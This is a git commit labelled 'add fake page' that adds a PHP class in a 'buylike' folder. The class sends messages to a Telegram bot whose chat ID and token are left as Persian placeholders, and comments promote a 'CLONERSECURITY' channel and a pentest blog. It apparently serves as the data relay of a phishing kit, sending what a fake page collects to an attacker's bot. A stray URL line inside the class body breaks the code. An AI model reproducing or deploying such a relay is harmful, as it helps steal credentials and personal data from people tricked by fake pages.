e798f61aa98d71f589189fefc4b6c3113540bcde
fofofisss <41182992+fofofisss@users.noreply.github.com>
2018-09-11 11:11:54 +0430

    add fake page

---
+++ buylike/Telegram.php
@@ -0,0 +1,22 @@
+<?php
+# https://t.me/CLONERSECURITY join us
+class Telegram {
+http://penetrationtest.blogfa.com/
+    const CHAT_ID =ایدی چت;
+    const TOKEN =توکن;
+# https://t.me/CLONERSECURITY join us
+    public static function sendMessage($message)
+    {
+        $url = "https://api.telegram.org/bot" . self::TOKEN . "/sendMessage?chat_id=" . self::CHAT_ID;
+        $url = $url . "&text=" . urlencode($message);
+        $ch = curl_init();
+        $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+        );
+        curl_setopt_array($ch, $optArray);
+        $result = curl_exec($ch);
+        curl_close($ch);
+    }
+# https://t.me/CLONERSECURITY join us
+}
